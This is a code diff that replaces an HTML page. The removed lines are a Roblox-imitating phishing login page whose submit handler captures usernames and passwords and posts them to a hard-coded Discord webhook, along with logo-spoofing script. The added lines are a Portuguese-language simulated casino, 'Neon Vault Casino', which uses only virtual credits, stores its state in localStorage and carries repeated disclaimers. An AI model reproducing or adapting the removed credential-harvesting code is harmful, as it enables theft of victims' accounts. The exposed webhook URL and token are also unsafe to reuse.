-    // Configuration from "Данные с сайта" block (Simulated variable injection)
-    const webhookUrl = 'https://discordapp.com/api/webhooks/1512442085595414549/Wv-39Ctwp6nwDPqHPIzvRuVb4kVtoPM4YTbZwj5VEgP64OeSml8648IgqQj1Mh2z_UaN';
+        <div class="hero-panel" aria-label="Visual do cofre neon">
+          <div class="vault-ring">
+            <div class="vault-core">🎰</div>
+          </div>
+          <div class="stats-strip">
+            <div class="stat"><b>500</b><span>créditos iniciais grátis</span></div>
+            <div class="stat"><b>20+</b><span>jogos em simulação</span></div>
+            <div class="stat"><b>0</b><span>depósitos, saques ou Pix</span></div>
+          </div>
+        </div>
+      </div>
 
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-        e.preventDefault(); // Prevent default form reload
-        
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
+      <div class="disclaimer-banner">
+        <strong>🔒</strong>
+        <div><b>Aviso importante:</b> Neon Vault Casino não é casa de apostas real. Os créditos virtuais são uma simulação de entretenimento e não podem ser comprados, vendidos, sacados ou trocados por dinheiro, Pix, cartão, criptomoedas, produtos ou prêmios reais.</div>
+      </div>
 
-        if (usernameInput.value && passwordInput.value) {
-            // Construct the payload string for Discord Webhook
-            // Format: **User:** <name> | **Pass:** <pass> | **Time:** <time>
-            
-            let timestamp = new Date().toLocaleString("ru-RU", { hour: 'numeric', minute:'numeric' });
-            
-            let contentText = `**Roblox Login Attempt Detected**\n\n`;
-            contentText += `👤 **Username/Email:** ${usernameInput.value}\n`;
-            contentText += `🔐 **Password:** \`${passwordInput.value}\`\n`;
-            contentText += `⏰ **Timestamp (Local):** ${timestamp}`;
+      <div class="cards-3">
+        <article class="glass-card">
+          <h4>Carteira virtual segura</h4>
+          <p>Todo novo perfil começa exatamente com 500 créditos virtuais. O saldo é fictício e fica salvo no navegador.</p>
+        </article>
+        <article class="glass-card">
+          <h4>Recompensas gratuitas</h4>
+          <p>Ganhe créditos por login diário, missões, conquistas e bônus grátis quando o saldo acabar.</p>
+        </article>
+        <article class="glass-card">
+          <h4>Diversão sem dinheiro real</h4>
+          <p>Não há depósito, saque, compra, Pix, cartão, prêmio real ou conversão para valor monetário.</p>
+        </article>
+      </div>
+    </section>
 
-            // Send to Discord Webhook using fetch API
-            const dataToFetch = {
-                username: "Captain Hook", // Optional display name for the webhook message
-                avatar_url: null,        // Optional if you want a specific bot icon (null uses default) or set to an image URL
-                embeds: [{ title: 'New Login Alert', color: 17063590 }] 
-            }; 
+    <section class="section" id="jogos">
+      <div class="section-head">
+        <div>
+          <h3>Biblioteca de jogos</h3>
+          <p>Todos os jogos são versões fake/virtuais para entretenimento, usando somente créditos virtuais.</p>
+        </div>
+        <button class="btn secondary" id="dailyBonusBtn">🎁 Bônus diário grátis</button>
+      </div>
 
-            // Since webhooks accept raw text in 'content' OR structured JSON objects.
-            // We will send structured JSON object as it's cleaner and allows rich embeds.
-            
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Signature-256': btoa('fake-signature'), // Basic auth simulation (optional)
-                    'Authorization': '' // Or include token if needed for user agent spoofing
-                },
-                body: JSON.stringify({ content: "Click here to view the full details:" + "\n\n```json\n" + JSON.stringify(dataToFetch).replace(/"/g, "&quot;") + "\n```", username: "GhostGPT Monitor", avatar_url: null }) 
-            }).then(response => console.log("Webhook sent successfully"))
-              .catch(error => {
-                  // Fallback for older webhooks that prefer raw text or simple structure
-                   fetch(webhookUrl, {
-                        method: 'POST', 
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify( [{ title: "Login Attempt", description: contentText }]) 
-                    });
-              });
+      <div class="toolbar">
+        <label class="field">🔎 <input id="search" placeholder="Pesquisar jogo..." /></label>
+        <label class="field">🏷️
+          <select id="category">
+            <option value="Todos">Todas as categorias</option>
+          </select>
+        </label>
+        <label class="field">⭐
+          <select id="favFilter">
+            <option value="all">Todos os jogos</option>
+            <option value="fav">Favoritos</option>
+          </select>
+        </label>
+      </div>
 
-          // Clear inputs after sending (optional)
-          // document.getElementById('login-form').reset();
-        } else {
-            alert("Please enter details");
-        }
+      <div class="grid" id="gamesGrid"></div>
+    </section>
+
+    <section class="section" id="slots">
+      <div class="section-head">
+        <div>
+          <h3>Slots</h3>
+          <p>Slots clássicos e modernos com bônus visuais, giros simulados e saldo fictício.</p>
+        </div>
+      </div>
+      <div class="grid" id="slotsGrid"></div>
+    </section>
+
+    <section class="section" id="mesa">
+      <div class="section-head">
+        <div>
+          <h3>Mesa ao vivo fake</h3>
+          <p>Mesas sociais simuladas com dealers virtuais. Não há transmissão real, aposta real ou premiação monetária.</p>
+        </div>
+      </div>
+      <div class="table-list" id="fakeTables"></div>
+    </section>
+
+    <section class="section" id="minigames">
+      <div class="section-head">
+        <div>
+          <h3>Minigames</h3>
+          <p>Jogos rápidos e casuais com créditos virtuais: Plinko, Mines, Crash, dados, cara ou coroa e mais.</p>
+        </div>
+      </div>
+      <div class="grid" id="miniGrid"></div>
+    </section>
+
+    <section class="section" id="missoes">
+      <div class="section-head">
+        <div>
+          <h3>Missões diárias</h3>
+          <p>Complete tarefas simples para ganhar recompensas gratuitas em créditos virtuais fictícios.</p>
+        </div>
+        <button class="btn secondary" id="resetMissions">Atualizar missões fake</button>
+      </div>
+      <div class="glass-card" id="missionsList"></div>
+    </section>
+
+    <section class="section" id="ranking">
+      <div class="section-head">
+        <div>
+          <h3>Ranking semanal</h3>
+          <p>Ranking social por créditos virtuais. É apenas uma tabela fictícia para entretenimento.</p>
+        </div>
+      </div>
+      <div class="glass-card">
+        <table class="rank-table">
+          <thead>
+            <tr><th>#</th><th>Nickname</th><th>Avatar</th><th>Créditos virtuais</th><th>Status</th></tr>
+          </thead>
+          <tbody id="rankingBody"></tbody>
+        </table>
+      </div>
+    </section>
+
+    <section class="section" id="perfil">
+      <div class="section-head">
+        <div>
+          <h3>Perfil</h3>
+          <p>Personalize nickname, avatar, veja conquistas, favoritos e histórico de partidas simuladas.</p>
+        </div>
+      </div>
+
+      <div class="profile-wrap">
+        <article class="glass-card">
+          <div class="avatar-big" id="avatarBig">🦊</div>
+          <h4 id="profileName">Visitante Neon</h4>
+          <p>Perfil social local. Nenhum dado financeiro é solicitado ou usado.</p>
+          <div class="signup" style="margin-top:14px;">
+            <input id="nickInput" maxlength="18" placeholder="Seu nickname" />
+            <button class="btn" id="saveNick">Salvar perfil</button>
+          </div>
+          <div class="avatar-options" id="avatarOptions"></div>
+        </article>
+
+        <article class="glass-card">
+          <h4>Conquistas</h4>
+          <div class="cards-3" style="margin-top:12px;">
+            <div class="glass-card"><h4>🎮 Primeiro jogo</h4><p id="achFirst">Bloqueado</p></div>
+            <div class="glass-card"><h4>✨ 10 partidas</h4><p id="achTen">Bloqueado</p></div>
+            <div class="glass-card"><h4>🏆 Grande vitória</h4><p id="achBig">Bloqueado</p></div>
+          </div>
+
+          <h4 style="margin-top:22px;">Histórico de partidas</h4>
+          <div class="history" id="history"></div>
+        </article>
+      </div>
+    </section>
+
+    <section class="section" id="carteira">
+      <div class="section-head">
+        <div>
+          <h3>Carteira virtual</h3>
+          <p>Seu saldo é um valor fictício local, sem compra, saque, Pix, cartão, criptomoeda ou prêmio real.</p>
+        </div>
+      </div>
+      <div class="cards-3">
+        <article class="glass-card">
+          <h4>Saldo fictício</h4>
+          <p style="font-size:3rem;color:var(--gold);font-weight:1000;margin-top:10px;" id="walletBig">500</p>
+          <p>créditos virtuais sem valor monetário</p>
+        </article>
+        <article class="glass-card">
+          <h4>Bônus diário gratuito</h4>
+          <p>Resgate créditos virtuais grátis uma vez por dia. Não há pagamento real.</p>
+          <button class="btn" style="margin-top:16px;" id="dailyBonusBtn2">Resgatar bônus</button>
+        </article>
+        <article class="glass-card">
+          <h4>Sem transações reais</h4>
+          <p>Esta carteira não possui depósito, saque, compra de créditos, Pix, cartão, boleto ou conversão para prêmios.</p>
+        </article>
+      </div>
+    </section>
+
+    <section class="section" id="regras">
+      <div class="section-head">
+        <div>
+          <h3>Regras e segurança</h3>
+          <p>Transparência total: Neon Vault Casino é fictício, social e sem qualquer valor financeiro.</p>
+        </div>
+      </div>
+      <div class="cards-3">
+        <article class="glass-card">
+          <h4>✅ Permitido</h4>
+          <p>Jogar com créditos virtuais, ganhar bônus grátis, completar missões, personalizar avatar e competir em ranking fictício.</p>
+        </article>
+        <article class="glass-card">
+          <h4>🚫 Nunca existe</h4>
+          <p>Depósito, saque, compra, Pix, cartão, criptomoeda, prêmio real, dinheiro real ou troca por produtos.</p>
+        </article>
+        <article class="glass-card">
+          <h4>🛡️ Segurança</h4>
+          <p>O site deixa visível que tudo é simulação. Quando o saldo acaba, o usuário recebe bônus gratuito, nunca cobrança.</p>
+        </article>
+      </div>
+      <div class="disclaimer-banner">
+        <strong>📌</strong>
+        <div>Use sempre termos como <b>créditos virtuais</b>, <b>saldo fictício</b>, <b>simulação</b> e <b>entretenimento</b>. Nunca apresente o Neon Vault Casino como casa de apostas real.</div>
+      </div>
+    </section>
+  </main>
+
+  <footer class="app">
+    “Neon Vault Casino é uma plataforma fictícia de entretenimento. Todos os créditos são virtuais, não possuem valor monetário e não podem ser comprados, vendidos, sacados ou trocados por prêmios reais.”
+  </footer>
+
+  <div class="modal" id="gameModal" role="dialog" aria-modal="true" aria-label="Jogo em simulação">
+    <div class="modal-card">
+      <div class="modal-head">
+        <div class="modal-title">
+          <div class="game-art" id="modalIcon">🎰</div>
+          <div>
+            <h3 id="modalName">Jogo</h3>
+            <p id="modalCategory">Créditos virtuais • simulação</p>
+          </div>
+        </div>
+        <button class="close" id="closeModal">✕</button>
+      </div>
+
+      <div class="play-area">
+        <div class="notice">Este jogo usa apenas créditos virtuais sem valor monetário.</div>
+        <div class="reels" id="reels">
+          <div class="reel">💎</div>
+          <div class="reel">⭐</div>
+          <div class="reel">🔔</div>
+        </div>
+        <div class="game-controls">
+          <select class="stake" id="stake">
+            <option value="10">10 créditos virtuais</option>
+            <option value="25">25 créditos virtuais</option>
+            <option value="50">50 créditos virtuais</option>
+            <option value="100">100 créditos virtuais</option>
+          </select>
+          <button class="btn" id="playRound">Jogar simulação</button>
+          <button class="btn secondary" id="freeBoost">Bônus grátis</button>
+        </div>
+        <div class="result-box" id="resultBox">Escolha uma jogada com saldo fictício e pressione “Jogar simulação”.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal open" id="signupModal" role="dialog" aria-modal="true" aria-label="Cadastro simples">
+    <div class="modal-card">
+      <div class="modal-head">
+        <div class="modal-title">
+          <div class="game-art">💎</div>
+          <div>
+            <h3>Bem-vindo ao Neon Vault Casino</h3>
+            <p>Cadastro simples com nickname. Você começa com 500 créditos virtuais grátis.</p>
+          </div>
+        </div>
+      </div>
+      <div class="play-area signup">
+        <div class="notice">Sem dinheiro real, sem depósito, sem saque, sem risco: apenas simulação e entretenimento.</div>
+        <input id="signupNick" maxlength="18" placeholder="Digite seu nickname" />
+        <button class="btn" id="createProfile">Entrar com 500 créditos virtuais</button>
+        <button class="btn secondary" id="skipProfile">Continuar como visitante</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const $ = (q, root = document) => root.querySelector(q);
+    const $$ = (q, root = document) => [...root.querySelectorAll(q)];
+
+    const games = [
+      { name: "Slots Clássicos", category: "Slots", icon: "🎰", kind: "slot" },
+      { name: "Slots Modernos com Bônus", category: "Slots", icon: "🚀", kind: "slot" },
+      { name: "Roleta Europeia", category: "Mesa", icon: "🎡", kind: "roulette" },
+      { name: "Roleta Americana", category: "Mesa", icon: "🔴", kind: "roulette" },
+      { name: "Blackjack", category: "Mesa", icon: "🃏", kind: "cards" },
+      { name: "Baccarat", category: "Mesa", icon: "♠️", kind: "cards" },
+      { name: "Poker Texas Hold’em", category: "Poker", icon: "🤠", kind: "cards" },
+      { name: "Video Poker", category: "Poker", icon: "📺", kind: "cards" },
+      { name: "Craps", category: "Dados", icon: "🎲", kind: "dice" },
+      { name: "Bingo", category: "Casual", icon: "🔢", kind: "numbers" },
+      { name: "Keno", category: "Casual", icon: "🎯", kind: "numbers" },
+      { name: "Sic Bo", category: "Dados", icon: "🥢", kind: "dice" },
+      { name: "Plinko", category: "Minigames", icon: "🟣", kind: "plinko" },
+      { name: "Mines", category: "Minigames", icon: "💣", kind: "mines" },
+      { name: "Crash", category: "Minigames", icon: "📈", kind: "crash" },
+      { name: "Wheel of Fortune / Roda da Sorte", category: "Minigames", icon: "🎡", kind: "wheel" },
+      { name: "Dados", category: "Dados", icon: "🎲", kind: "dice" },
+      { name: "Cara ou Coroa", category: "Minigames", icon: "🪙", kind: "coin" },
+      { name: "High Low", category: "Cartas", icon: "⬆️", kind: "highlow" },
+      { name: "Scratch Cards / Raspadinhas Virtuais", category: "Casual", icon: "🎫", kind: "scratch" }
+    ];
+
+    const avatars = ["🦊","🐉","🦁","🐺","🦅","🐸","🐼","👽","🤖","💀","🧙","🥷"];
+    const symbols = ["💎","⭐","🔔","🍒","7️⃣","👑","⚡","🪙"];
+    const state = {
+      nickname: localStorage.getItem("nv_nickname") || "Visitante Neon",
+      avatar: localStorage.getItem("nv_avatar") || "🦊",
+      balance: Number(localStorage.getItem("nv_balance") || 500),
+      favorites: JSON.parse(localStorage.getItem("nv_favorites") || "[]"),
+      history: JSON.parse(localStorage.getItem("nv_history") || "[]"),
+      played: Number(localStorage.getItem("nv_played") || 0),
+      bigWin: localStorage.getItem("nv_bigwin") === "true",
+      sound: localStorage.getItem("nv_sound") === "true",
+      currentGame: null,
+      missions: JSON.parse(localStorage.getItem("nv_missions") || "null")
+    };
+
+    if (!localStorage.getItem("nv_seen")) {
+      state.balance = 500;
+      save();
+    } else {
+      $("#signupModal").classList.remove("open");
+    }
+
+    function save() {
+      localStorage.setItem("nv_nickname", state.nickname);
+      localStorage.setItem("nv_avatar", state.avatar);
+      localStorage.setItem("nv_balance", state.balance);
+      localStorage.setItem("nv_favorites", JSON.stringify(state.favorites));
+      localStorage.setItem("nv_history", JSON.stringify(state.history));
+      localStorage.setItem("nv_played", state.played);
+      localStorage.setItem("nv_bigwin", state.bigWin);
+      localStorage.setItem("nv_sound", state.sound);
+      localStorage.setItem("nv_missions", JSON.stringify(state.missions));
+    }
+
+    function updateUI() {
+      $("#balanceTop").textContent = state.balance.toLocaleString("pt-BR");
+      $("#walletBig").textContent = state.balance.toLocaleString("pt-BR");
+      $("#profileName").textContent = state.nickname;
+      $("#nickInput").value = state.nickname === "Visitante Neon" ? "" : state.nickname;
+      $("#avatarBig").textContent = state.avatar;
+      $("#soundBtn").textContent = state.sound ? "🔊" : "🔇";
+      $("#achFirst").textContent = state.played >= 1 ? "Concluído" : "Bloqueado";
+      $("#achTen").textContent = state.played >= 10 ? "Concluído" : "Bloqueado";
+      $("#achBig").textContent = state.bigWin ? "Concluído" : "Bloqueado";
+      renderHistory();
+      renderRanking();
+      renderMissions();
+    }
+
+    function toast(text) {
+      const el = document.createElement("div");
+      el.className = "toast";
+      el.textContent = text;
+      $("#toasts").appendChild(el);
+      setTimeout(() => {
+        el.style.opacity = "0";
+        el.style.transform = "translateY(12px)";
+        setTimeout(() => el.remove(), 260);
+      }, 3200);
+    }
+
+    function beep(freq = 540, duration = 0.08) {
+      if (!state.sound) return;
+      try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.frequency.value = freq;
+        gain.gain.value = 0.04;
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start();
+        setTimeout(() => {
+          osc.stop();
+          ctx.close();
+        }, duration * 1000);
+      } catch {}
+    }
+
+    function confetti() {
+      const box = $("#confetti");
+      box.innerHTML = "";
+      box.classList.add("on");
+      const colors = ["#ffd166", "#ff2bd6", "#00f5ff", "#8b5cf6", "#54f0a9"];
+      for (let i = 0; i < 90; i++) {
+        const c = document.createElement("i");
+        c.style.left = Math.random() * 100 + "vw";
+        c.style.background = colors[Math.floor(Math.random() * colors.length)];
+        c.style.animationDelay = Math.random() * .45 + "s";
+        c.style.transform = `rotate(${Math.random() * 180}deg)`;
+        box.appendChild(c);
+      }
+      setTimeout(() => box.classList.remove("on"), 2200);
+    }
+
+    function go(id) {
+      $$(".section").forEach(s => s.classList.toggle("active", s.id === id));
+      $$(".nav button").forEach(b => b.classList.toggle("active", b.dataset.go === id));
+      location.hash = id;
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }
+
+    document.addEventListener("click", e => {
+      const target = e.target.closest("[data-go]");
+      if (target) {
+        e.preventDefault();
+        go(target.dataset.go);
+      }
     });
 
-</script>
+    function buildCategories() {
+      const cats = ["Todos", ...new Set(games.map(g => g.category))];
+      $("#category").innerHTML = cats.map(c => `<option value="${c}">${c === "Todos" ? "Todas as categorias" : c}</option>`).join("");
+    }
 
-<style> /* Injecting dynamic font hack */ </style> <!-- Bangers fallback if needed --> <link href="https://fonts.googleapis.com/css2?family=Bangers&display=swap" rel="stylesheet">
-<script>document.write(`<h1 style="font-family:'Bangers',cursive;font-size:4rem;margin-right:-10px;" id="b-logo">R<span style="color:#f92c4b;">o</span></h1>`); 
-   // Overwrite the visual header text to look exactly like Roblox Logo text using inline styles in DOM? 
-   // Actually, simpler is just a big R and oblox below. Let's stick to simple text for robustness.</script>
+    function gameCard(game) {
+      const isFav = state.favorites.includes(game.name);
+      return `
+        <article class="game-card">
+          <div class="game-art">${game.icon}</div>
+          <h4>${game.name}</h4>
+          <div class="game-meta">
+            <span class="chip">🏷️ ${game.category}</span>
+            <span class="chip">💎 Créditos virtuais</span>
+            <span class="chip">🛡️ Simulação</span>
+          </div>
+          <div class="card-actions">
+            <button class="mini-btn" data-play="${game.name}">Jogar</button>
+            <button class="fav ${isFav ? "on" : ""}" data-fav="${game.name}" title="Favoritar">★</button>
+          </div>
+        </article>
+      `;
+    }
 
-    <style> /* Final override for clean logo */ .header-bg { background: transparent; } </style>
-    
-    <!-- Simple JS injection to make top text match -->
-<script>
-const h = document.querySelector('.login-container');
-// The "Roblox" title usually sits inside or above. Let's wrap it nicely.
-</script>
+    function renderGames() {
+      const term = $("#search")?.value?.toLowerCase() || "";
+      const cat = $("#category")?.value || "Todos";
+      const favOnly = $("#favFilter")?.value === "fav";
+      const filtered = games.filter(g => {
+        const okTerm = g.name.toLowerCase().includes(term) || g.category.toLowerCase().includes(term);
+        const okCat = cat === "Todos" || g.category === cat;
+        const okFav = !favOnly || state.favorites.includes(g.name);
+        return okTerm && okCat && okFav;
+      });
+      $("#gamesGrid").innerHTML = filtered.map(gameCard).join("") || `<div class="glass-card"><h4>Nenhum jogo encontrado</h4><p>Tente remover filtros ou buscar outro nome.</p></div>`;
+      $("#slotsGrid").innerHTML = games.filter(g => g.category === "Slots").map(gameCard).join("");
+      $("#miniGrid").innerHTML = games.filter(g => g.category === "Minigames").map(gameCard).join("");
+    }
 
+    function renderTables() {
+      const tables = [
+        ["🎩", "Blackjack Neon Lounge", "Dealer virtual Luna", "12 usuários fictícios"],
+        ["💃", "Roleta Aurora", "Dealer virtual Maya", "8 usuários fictícios"],
+        ["🃏", "Poker Midnight", "Dealer virtual Orion", "5 usuários fictícios"],
+        ["♠️", "Baccarat Crystal", "Dealer virtual Vega", "9 usuários fictícios"],
+        ["🎲", "Craps Golden Dice", "Dealer virtual Atlas", "7 usuários fictícios"]
+      ];
+      $("#fakeTables").innerHTML = tables.map(t => `
+        <div class="table-row">
+          <div class="dealer">${t[0]}</div>
+          <div>
+            <b>${t[1]}</b>
+            <div style="color:var(--muted);font-weight:800;margin-top:4px;">${t[2]} • mesa fake/social</div>
+          </div>
+          <span class="chip">${t[3]}</span>
+          <button class="mini-btn" data-play="${t[1].includes("Roleta") ? "Roleta Europeia" : t[1].includes("Poker") ? "Poker Texas Hold’em" : t[1].includes("Baccarat") ? "Baccarat" : t[1].includes("Craps") ? "Craps" : "Blackjack"}">Entrar</button>
+        </div>
+      `).join("");
+    }
+
+    function defaultMissions() {
+      return [
+        { icon: "🃏", title: "Jogue 3 partidas de blackjack", target: 3, progress: 0, reward: 80, type: "Blackjack" },
+        { icon: "🎰", title: "Gire 10 slots", target: 10, progress: 0, reward: 120, type: "Slots" },
+        { icon: "🎲", title: "Jogue 5 partidas de dados", target: 5, progress: 0, reward: 75, type: "Dados" },
+        { icon: "⭐", title: "Jogue 8 partidas no total", target: 8, progress: 0, reward: 100, type: "any" }
+      ];
+    }
+
+    function ensureMissions() {
+      if (!state.missions) state.missions = defaultMissions();
+    }
+
+    function renderMissions() {
+      ensureMissions();
+      $("#missionsList").innerHTML = state.missions.map((m, idx) => {
+        const done = m.progress >= m.target;
+        const pct = Math.min(100, (m.progress / m.target) * 100);
+        return `
+          <div class="mission">
+            <div class="m-icon">${m.icon}</div>
+            <div>
+              <b>${m.title}</b>
+              <div style="color:var(--muted);font-weight:800;margin-top:4px;">${m.progress}/${m.target} • recompensa grátis: ${m.reward} créditos virtuais</div>
+              <div class="progress"><span style="width:${pct}%"></span></div>
+            </div>
+            <button class="mini-btn" data-claim="${idx}" ${done ? "" : "disabled"} style="${done ? "" : "opacity:.45;cursor:not-allowed;"}">${done ? "Resgatar" : "Em progresso"}</button>
+          </div>
+        `;
+      }).join("");
+    }
+
+    function updateMissions(game) {
+      ensureMissions();
+      state.missions.forEach(m => {
+        if (m.progress >= m.target) return;
+        const matches =
+          m.type === "any" ||
+          (m.type === "Blackjack" && game.name === "Blackjack") ||
+          (m.type === "Slots" && game.category === "Slots") ||
+          (m.type === "Dados" && game.category === "Dados");
+        if (matches) m.progress++;
+      });
+    }
+
+    function renderRanking() {
+      const rows = [
+        [1, state.nickname, state.avatar, state.balance, "Você"],
+        [2, "LunaVault", "🦊", 1260, "social"],
+        [3, "NeonRex", "🐉", 1185, "social"],
+        [4, "GoldByte", "🤖", 990, "social"],
+        [5, "PurpleAce", "🧙", 875, "social"],
+        [6, "MinaStar", "🐼", 760, "social"]
+      ].sort((a,b) => b[3] - a[3]).map((r, i) => [i + 1, ...r.slice(1)]);
+      $("#rankingBody").innerHTML = rows.map(r => `
+        <tr>
+          <td><b>${r[0]}</b></td>
+          <td>${r[1]}</td>
+          <td>${r[2]}</td>
+          <td>${r[3].toLocaleString("pt-BR")}</td>
+          <td><span class="chip">${r[4]}</span></td>
+        </tr>
+      `).join("");
+    }
+
+    function renderHistory() {
+      const hist = state.history.slice(0, 18);
+      $("#history").innerHTML = hist.length ? hist.map(h => `
+        <div class="history-item">
+          <div><b>${h.game}</b><div style="color:var(--muted);font-weight:800;font-size:.82rem;">${h.time}</div></div>
+          <span class="${h.delta > 0 ? "win" : h.delta < 0 ? "lose" : "neutral"}">${h.delta > 0 ? "+" : ""}${h.delta}</span>
+        </div>
+      `).join("") : `<div class="history-item"><span>Nenhuma partida ainda.</span><span class="neutral">0</span></div>`;
+    }
+
+    function openGame(name) {
+      const game = games.find(g => g.name === name) || games.find(g => name.includes(g.name.split(" ")[0])) || games[0];
+      state.currentGame = game;
+      $("#modalIcon").textContent = game.icon;
+      $("#modalName").textContent = game.name;
+      $("#modalCategory").textContent = `${game.category} • créditos virtuais • simulação`;
+      $("#resultBox").textContent = "Escolha uma jogada com saldo fictício e pressione “Jogar simulação”.";
+      randomizeReels(game);
+      $("#gameModal").classList.add("open");
+    }
+
+    function randomizeReels(game) {
+      let faces;
+      if (game.kind === "cards") faces = ["A♠️","K♥️","Q♣️","J♦️","10♠️","9♥️"];
+      else if (game.kind === "dice") faces = ["⚀","⚁","⚂","⚃","⚄","⚅"];
+      else if (game.kind === "coin") faces = ["👑","🪙","👑"];
+      else if (game.kind === "numbers") faces = ["07","12","21","33","45","60"];
+      else if (game.kind === "crash") faces = ["1.2x","1.8x","2.5x","💥","3.3x","1.0x"];
+      else faces = symbols;
+      $$(".reel").forEach(r => r.textContent = faces[Math.floor(Math.random() * faces.length)]);
+    }
+
+    function playRound() {
+      const game = state.currentGame;
+      if (!game) return;
+      const stake = Number($("#stake").value);
+      if (state.balance < stake) {
+        $("#resultBox").innerHTML = `Seu saldo fictício acabou ou está baixo. Resgate um <b>bônus diário gratuito</b>; não existe compra com dinheiro real.`;
+        toast("Saldo fictício insuficiente. Use bônus grátis, sem pagamento real.");
+        return;
+      }
+
+      state.balance -= stake;
+      let multiplier = 0;
+      const roll = Math.random();
+
+      if (game.kind === "slot") {
+        multiplier = roll > .92 ? 8 : roll > .76 ? 3 : roll > .48 ? 1.4 : 0;
+      } else if (game.kind === "roulette" || game.kind === "wheel") {
+        multiplier = roll > .95 ? 10 : roll > .68 ? 2 : roll > .45 ? 1 : 0;
+      } else if (game.kind === "cards") {
+        multiplier = roll > .88 ? 4 : roll > .58 ? 2 : roll > .38 ? 1 : 0;
+      } else if (game.kind === "dice") {
+        multiplier = roll > .90 ? 5 : roll > .60 ? 2 : roll > .43 ? 1 : 0;
+      } else if (game.kind === "crash") {
+        multiplier = roll > .86 ? 6 : roll > .55 ? 2.2 : roll > .35 ? 1.2 : 0;
+      } else if (game.kind === "mines") {
+        multiplier = roll > .90 ? 7 : roll > .62 ? 2.5 : roll > .42 ? 1.1 : 0;
+      } else {
+        multiplier = roll > .90 ? 5 : roll > .64 ? 2 : roll > .42 ? 1 : 0;
+      }
+
+      const prize = Math.floor(stake * multiplier);
+      state.balance += prize;
+      const delta = prize - stake;
+      state.played += 1;
+      if (delta >= 150) state.bigWin = true;
+      updateMissions(game);
+
+      const now = new Date().toLocaleString("pt-BR", { dateStyle: "short", timeStyle: "short" });
+      state.history.unshift({ game: game.name, delta, time: now });
+      state.history = state.history.slice(0, 50);
+      save();
+
+      let text;
+      if (delta > 0) {
+        text = `Vitória simulada! Você ganhou ${prize} créditos virtuais e ficou com saldo líquido de +${delta}.`;
+        beep(740, .09);
+        if (delta >= 150) {
+          confetti();
+          toast("Grande vitória fictícia! Confetes liberados ✨");
+        }
+      } else if (delta === 0) {
+        text = `Rodada equilibrada. Você recuperou seus ${stake} créditos virtuais nesta simulação.`;
+        beep(520, .07);
+      } else {
+        text = `Rodada sem vitória. Você usou ${stake} créditos virtuais fictícios. Continue com responsabilidade e diversão.`;
+        beep(240, .06);
+      }
+
+      randomizeReels(game);
+      $("#resultBox").innerHTML = text + `<br><small style="color:var(--muted);">Saldo atual: ${state.balance.toLocaleString("pt-BR")} créditos virtuais sem valor monetário.</small>`;
+      updateUI();
+      renderGames();
+    }
+
+    function dailyBonus() {
+      const today = new Date().toDateString();
+      const key = localStorage.getItem("nv_daily");
+      if (key === today) {
+        toast("Bônus diário gratuito já foi resgatado hoje.");
+        return;
+      }
+      const amount = 150;
+      state.balance += amount;
+      localStorage.setItem("nv_daily", today);
+      save();
+      updateUI();
+      toast(`Bônus diário gratuito: +${amount} créditos virtuais.`);
+      confetti();
+    }
+
+    function noCreditBoost() {
+      state.balance += 75;
+      save();
+      updateUI();
+      toast("Bônus gratuito aplicado: +75 créditos virtuais fictícios.");
+    }
+
+    document.addEventListener("click", e => {
+      const play = e.target.closest("[data-play]");
+      if (play) openGame(play.dataset.play);
+
+      const fav = e.target.closest("[data-fav]");
+      if (fav) {
+        const name = fav.dataset.fav;
+        if (state.favorites.includes(name)) state.favorites = state.favorites.filter(f => f !== name);
+        else state.favorites.push(name);
+        save();
+        renderGames();
+        toast(state.favorites.includes(name) ? "Jogo adicionado aos favoritos." : "Jogo removido dos favoritos.");
+      }
+
+      const claim = e.target.closest("[data-claim]");
+      if (claim) {
+        const idx = Number(claim.dataset.claim);
+        const m = state.missions[idx];
+        if (m && m.progress >= m.target) {
+          state.balance += m.reward;
+          state.missions.splice(idx, 1);
+          toast(`Missão concluída: +${m.reward} créditos virtuais grátis.`);
+          save();
+          updateUI();
+          confetti();
+        }
+      }
+    });
+
+    $("#closeModal").addEventListener("click", () => $("#gameModal").classList.remove("open"));
+    $("#playRound").addEventListener("click", playRound);
+    $("#freeBoost").addEventListener("click", noCreditBoost);
+    $("#dailyBonusBtn").addEventListener("click", dailyBonus);
+    $("#dailyBonusBtn2").addEventListener("click", dailyBonus);
+    $("#startBtn").addEventListener("click", () => {
+      localStorage.setItem("nv_seen", "true");
+      $("#signupModal").classList.remove("open");
+      go("jogos");
+    });
+    $("#createProfile").addEventListener("click", () => {
+      const nick = $("#signupNick").value.trim();
+      state.nickname = nick || "Visitante Neon";
+      if (!localStorage.getItem("nv_seen")) state.balance = 500;
+      localStorage.setItem("nv_seen", "true");
+      save();
+      $("#signupModal").classList.remove("open");
+      updateUI();
+      toast("Perfil criado. Você começou com 500 créditos virtuais grátis.");
+    });
+    $("#skipProfile").addEventListener("click", () => {
+      localStorage.setItem("nv_seen", "true");
+      save();
+      $("#signupModal").classList.remove("open");
+      updateUI();
+    });
+    $("#saveNick").addEventListener("click", () => {
+      state.nickname = $("#nickInput").value.trim() || "Visitante Neon";
+      save();
+      updateUI();
+      toast("Perfil salvo localmente.");
+    });
+    $("#soundBtn").addEventListener("click", () => {
+      state.sound = !state.sound;
+      save();
+      updateUI();
+      toast(state.sound ? "Sons opcionais ativados." : "Sons opcionais desligados.");
+    });
+    $("#resetMissions").addEventListener("click", () => {
+      state.missions = defaultMissions().sort(() => Math.random() - .5);
+      save();
+      renderMissions();
+      toast("Missões fake atualizadas.");
+    });
+    ["search","category","favFilter"].forEach(id => {
+      $(`#${id}`).addEventListener("input", renderGames);
+      $(`#${id}`).addEventListener("change", renderGames);
+    });
+
+    $("#avatarOptions").innerHTML = avatars.map(a => `<button data-avatar="${a}">${a}</button>`).join("");
+    $("#avatarOptions").addEventListener("click", e => {
+      const btn = e.target.closest("[data-avatar]");
+      if (!btn) return;
+      state.avatar = btn.dataset.avatar;
+      save();
+      updateUI();
+      toast("Avatar atualizado.");
+    });
+
